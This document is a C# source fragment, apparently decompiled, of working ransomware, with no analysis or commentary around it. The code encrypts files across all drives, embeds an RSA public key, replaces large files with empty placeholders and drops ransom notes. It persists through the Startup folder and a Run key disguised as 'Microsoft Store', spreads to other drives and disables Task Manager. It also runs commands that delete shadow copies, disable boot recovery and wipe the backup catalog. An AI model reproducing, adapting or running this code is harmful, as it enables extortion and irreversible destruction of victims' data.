	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					string text = CreatePassword(40);
					if (fileInfo.Length < 1368709120L)
					{
						string keyRSA = RSA_Encrypt(text, rsaKey());
						if (checkDirContains(files[i]) && checkFileName(fileInfo.Name))
						{
							AES_Encrypt(files[i], text, keyRSA);
						}
					}
					else
					{
						AES_Encrypt_Large(files[i], text, fileInfo.Length);
					}
					if (flag)
					{
						flag = false;
						string path = location + "/" + droppedMessageTextbox;
						string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
						if (!File.Exists(path) && location != folderPath)
						{
							File.WriteAllLines(path, messages);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool checkFileName(string fileName)
	{
		string[] array = new string[12]
		{
			"boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log", "ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak",
			"bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		int num = 0;
		while (true)
		{
			if (num < array2.Length)
			{
				string text = array2[num];
				if (text == fileName)
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[3] { "appdata\\local", "appdata\\locallow", "users\\all users" };
		string[] array2 = array;
		int num = 0;
		while (true)
		{
			if (num < array2.Length)
			{
				string value = array2[num];
				if (directory.Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>7FRjzRCZDsqMu3S9pVWSoSFKDNFNgnGHNPy2ptV1R3lI148gmCJMeMCvAVgCD7djBOCozadgX6WXque62MfVVnixpBPUGqbTEcXftpmkgGW3xTeQuZClXbJsm5d90PdRyx+9V3q1xyBeT4ekM5GV22IV2V/aWFlY1FCXDWmvf8uCO+AvB7rW0iTt7sBQC2c20OMdjXr4zmdlkdTZHOIHs98di0G/hFmVrkwAW29w2OvF+VFETVQZs0UdS4OXsBvJvz0gMdZ3/xNBPEGzHBgAR56dKsIiLl4lYS3o6K5dLXddwurK6eyENwRCUTCBcBUmU9b2nQbMAOfBl1nAOAsk0Q==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Small(string inputFile, string passwordBytes)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(passwordBytes);
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream stream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.Zeros;
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(stream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.CopyTo(cryptoStream);
			fileStream.Flush();
			cryptoStream.Flush();
			fileStream.Close();
			cryptoStream.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string text = "C:\\";
			if (driveInfo.ToString() == text)
			{
				string[] array = new string[9] { "Program Files", "Program Files (x86)", "Windows", "Intel", "PerfLogs", "Windows.old", "AMD", "NVIDIA", "ProgramData" };
				string[] directories = Directory.GetDirectories(text);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
